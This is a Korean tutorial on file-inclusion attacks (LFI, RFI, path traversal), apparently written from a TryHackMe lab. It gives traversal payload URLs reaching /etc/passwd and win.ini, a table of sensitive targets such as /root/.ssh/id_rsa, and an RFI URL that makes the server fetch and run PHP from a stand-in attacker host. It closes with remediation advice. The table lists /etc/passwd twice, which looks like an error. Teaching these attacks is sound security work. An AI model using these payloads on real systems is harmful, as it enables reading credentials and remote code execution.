1. 파일 포함 공격

파일 포함 공격이란

이번 수업에서는 LFI(Local File Inclusion), RFI(Remote File Inclusion) 및 디렉터리 통과를 포함하여 파일 포함 취약점을 악용하기 위한 필수 지식을 갖추는 것을 목표로 합니다 .

몇몇 웹 사이트에서 웹 응용 프로그램은 매개변수를 통해 이미지, 정적 텍스트 등을 포함하여 지정된 시스템의 파일에 대한 액세스를 요청하도록 구성되어 있습니다.

매개변수는 데이터를 검색하거나 사용자 입력에 따라 작업을 수행하는 데 사용할 수 있는 URL에 연결된 쿼리 매개변수 문자열입니다.

사용자가 웹 서버에서 파일 액세스를 요청하는 경우에 대해 생각해 봅시다.  먼저 사용자는 표시할 파일이 포함된 HTTP 요청을 웹 서버에 보냅니다. 예를 들어 사용자가 웹 애플리케이션 내에서 자신의 이력서에 액세스하여 표시하려는 경우 요청은 다음과 같을 수 있습니다.  http://webapp.thm/get.php?file=userCV.pdf 여기서 파일은 매개변수이고 userCV.pdf 는 액세스하는 데 필요한 파일입니다.

파일 포함 취약점이 발생하는 이유는 무엇일까요?

파일 포함 취약점은 일반적 으로 잘못 작성되고 구현된 PHP와 같은 웹 애플리케이션용  다양한 프로그래밍 언어  에서 발견되고 악용됩니다  . 이러한 취약점의 주요 문제는 사용자 입력이 삭제되거나 검증되지 않고 사용자가 제어하는 ​​입력 유효성 검사입니다. 입력이 검증되지 않은 경우 사용자는 모든 입력을 함수에 전달할 수 있으므로 취약점이 발생합니다.

파일 포함의 위험은 무엇입니까?

기본적으로 공격자는 파일 포함 취약성을 이용하여 웹 애플리케이션이나 운영 체제와 관련된 코드, 자격 증명 또는 기타 중요한 파일과 같은 데이터를 유출할 수 있습니다. 또한 공격자가 다른 방법으로 서버에 파일을 쓸 수 있는 경우 파일 포함을 함께 사용하여 RCE(원격 명령 실행)를 얻을 수 있습니다.

경로 순회

디렉터리 순회 라고도 하는  웹 보안 취약점을 통해 공격자는 애플리케이션을 실행하는 서버의 로컬 파일과 같은 운영 체제 리소스를 읽을 수 있습니다. 공격자는 웹 응용 프로그램의 URL을 조작하고 악용하여 응용 프로그램의 루트 디렉터리 외부에 저장된 파일 또는 디렉터리를 찾아 액세스함으로써 이 취약점을 악용합니다.

경로  순회 취약성은 사용자 입력이 PHP 의 file_get_contents와 같은 함수로 전달될 때 발생합니다 . 함수가 취약점의 주요 원인이 아니라는 점에 유의해야 합니다. 잘못된 입력 검증 또는 필터링이 취약점의 원인인 경우가 많습니다 . PHP 에서는 file_get_contents를 사용하여 파일 내용을 읽을 수 있습니다

웹 애플리케이션이 어떻게 작동하는지 확인하기 위해 페이로드를 추가하여 URL 매개변수를 테스트할 수 있습니다. 점 -점-슬래시 공격으로도 알려진 경로 순회 공격은 이중 점 ../ 를 사용하여 디렉터리를 한 단계 위로 이동하는 이점을 이용합니다 . 공격자가 진입점(이 경우 get.php?file= )을 찾으면 공격자는 다음과 같이 무언가를 보낼 수 있습니다.  http://webapp.thm/get.php?file=../../.. /../etc/passwd

입력 유효성 검사가 없고 /var/www/app/CVs 위치에서 PDF 파일에 액세스하는 대신 웹 응용 프로그램이 다른 디렉터리(이 경우에는 /etc/passwd ) 에서 파일을 검색한다고 가정합니다 . 각 .. 항목은 루트 디렉토리 / 에 도달할 때까지 하나의 디렉토리를 이동합니다 . 그런 다음 디렉토리를 /etc 로 변경 하고 거기에서 passwd 파일을 읽습니다.

저렇게 필터링을 하지 않고 그냥 받아들이면 속수무책으로 상위 디렉토리가 읽혀버리게 됩니다.

마찬가지로 웹 애플리케이션이 Windows 서버에서 실행되는 경우 공격자는 Windows 경로를 제공해야 합니다. 예를 들어 공격자가 c:\boot.ini 에 있는 boot.ini 파일을 읽으려는 경우 공격자는 대상 OS 버전에 따라 다음을 시도할 수 있습니다.

http://webapp.thm/get.php?file=../../../../boot.ini  또는

http://webapp.thm/get.php?file=../../../../windows/win.ini

Linux 운영 체제 와 동일한 개념이 여기에 적용되며 루트 디렉터리(일반적으로 c:\ ) 에 도달할 때까지 디렉터리를 올라갑니다 .

경우에 따라 개발자는 필터를 추가하여 특정 파일이나 디렉터리에 대한 액세스만 제한합니다.  다음은 테스트할 때 사용할 수 있는  몇 가지 일반적인 OS 파일입니다 .

표
위치 설명
/etc/issue 로그인 프롬프트 전에 인쇄할 메시지 또는 시스템 ID를 포함합니다.
/etc/profile 내보내기 변수, 파일 생성 마스크(umask), 터미널 유형, 새 메일이 도착했을 때를 나타내는 메일 메시지와 같은 시스템 전체 기본 변수를 제어합니다.
/proc/version Linux 커널 의 버전을 지정합니다.
/etc/passwd 시스템에 액세스할 수 있는 모든 등록된 사용자가 있음
/etc/passwd 시스템 사용자의 암호에 대한 정보를 포함합니다.
/root/.bash_history 루트 사용자 에 대한 기록 명령을 포함합니다.
/var/log/dmessage 시스템 시작 중에 기록되는 메시지를 포함하여 전역 시스템 메시지를 포함합니다.
/var/mail/root 루트 사용자 의 모든 이메일
/root/.ssh/id_rsa 루트 또는 서버의 알려진 유효한 사용자에 대한 개인 SSH 키
/var/log/apache2/access.log Apache  웹 서버 에 대한 액세스 요청
c:\boot.ini BIOS 펌웨어가 있는 컴퓨터의 부팅 옵션을 포함합니다.

이와 같은 공격들을 방어하려면 필수적으로 필터링을 해야합니다.

로컬 파일 포함 – LFI

로컬 파일 포함**( LFI)

웹 애플리케이션에 대한 LFI 공격은 종종 개발자의 보안 인식 부족으로 인해 발생합니다. PHP 에서 include , require , include_once 및 require_once 와 같은 기능을 사용하면 종종 취약한 웹 애플리케이션에 기여합니다. 이 방에서는 PHP를 선택하지만 LFI 취약성은 ASP, JSP 또는 Node.js 앱과 같은 다른 언어를 사용할 때도 발생합니다. LFI 익스플로잇은 경로 순회와 동일한 문제점에서 발생합니다.

실습 1

먼저 사이트에서 제공한 첫 번째 랩실에 들어가세요. 제공한 웹 사이트는 PHP로 만들어졌기 때문에 우리는 위에서 배운 취약점을 그래도 사용할 수 있습니다. 물론 다른 사이트여도 보안 설정이 없으면 숭숭 뚫립니다.

먼저 접속 후에 사이트 링크 + ? + =+ 보고 싶은 디렉토리 주소를 입력해주겠습니다.

여기서 실습은 /etc/passwd를 입력하라고 했으니 디렉토리 주소에 저 주소를 넣어주세요.

그러면 정답으로 나올겁니다.

해당 링크 + lang= + ../../../../etc/passwd

 원격 파일 포함 – RFI

RFI(원격 파일 포함)는 원격 파일을 취약한 응용 프로그램에 포함시키는 기술입니다. LFI와 마찬가지로 RFI는 사용자 입력을 부적절하게 삭제하여 공격자가 외부 URL을 포함 기능에 삽입할 수 있도록 할 때 발생합니다. RFI에 대한 한 가지 요구 사항은 allow_url_fopen 옵션이 켜져 있어야 한다는 것입니다 .
RFI 취약점으로 인해 공격자가 서버에서 RCE(원격 명령 실행)를 얻을 수 있으므로 RFI의 위험이 LFI보다 높습니다. 성공적인 RFI 공격의 다른 결과는 다음과 같습니다.

  • 민감한 정보 공개
  • XSS(교차 사이트 스크립팅)
  • 서비스 거부(DoS)

RFI 단계 

다음 그림은 성공적인 RFI 공격을 위한 단계의 예입니다! 공격자가 자신의 서버 http://attacker.thm/cmd.txt 에서 PHP 파일을 호스팅하고 있다고 가정해 보겠습니다. 여기서 cmd.txt 에는 인쇄 메시지  Hello THM 이 포함되어 있습니다 .
<?PHP echo "Hello THM"; ?>
먼저 공격자는 http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt와 같이 공격자의 서버를 가리키는 악성 URL을 주입합니다. . 입력 유효성 검사가 없으면 악성 URL이 포함 기능으로 전달됩니다. 다음으로 웹 앱 서버는 악성 서버에 GET 요청을 보내 파일을 가져옵니다. 결과적으로 웹 앱은 원격 파일을 include 함수에 포함시켜 페이지 내에서 PHP 파일을 실행하고 실행 내용을 공격자에게 보냅니다. 우리의 경우 현재 페이지 어딘가에 Hello THM 메시지가 표시되어야 합니다.

개선

개발자로서 웹 애플리케이션 취약점, 이를 찾는 방법 및 방지 방법을 알고 있는 것은 중요합니다. 파일 포함 취약점을 방지하기 위한 몇 가지 일반적인 제안은 다음과 같습니다.

  1. 웹 애플리케이션 프레임워크를 포함한 시스템 및 서비스를 최신 버전으로 업데이트하십시오.
  2. 응용 프로그램의 경로 및 잠재적으로 드러나는 기타 정보가 유출되지 않도록 PHP 오류를 끕니다.
  3. 웹 애플리케이션 방화벽(WAF)은 웹 애플리케이션 공격을 완화하는 데 도움이 되는 좋은 옵션입니다.
  4. allow_url_fopen on 및 allow_url_include 와 같이 웹 앱에 필요하지 않은 경우 파일 포함 취약점을 유발하는 일부 PHP 기능을 비활성화합니다 .
  5. 웹 애플리케이션을 신중하게 분석하고 필요한 프로토콜과 PHP 래퍼만 허용합니다.
  6. 사용자 입력을 절대 신뢰하지 말고 파일 포함에 대해 적절한 입력 유효성 검사를 구현해야 합니다.
  7. 파일 이름 및 위치에 대한 화이트리스트와 블랙리스트를 구현하십시오.

이와 같은 방법들을 기초적으로 구현해야 파일 포함 공격을 방어할 수 있습니다.
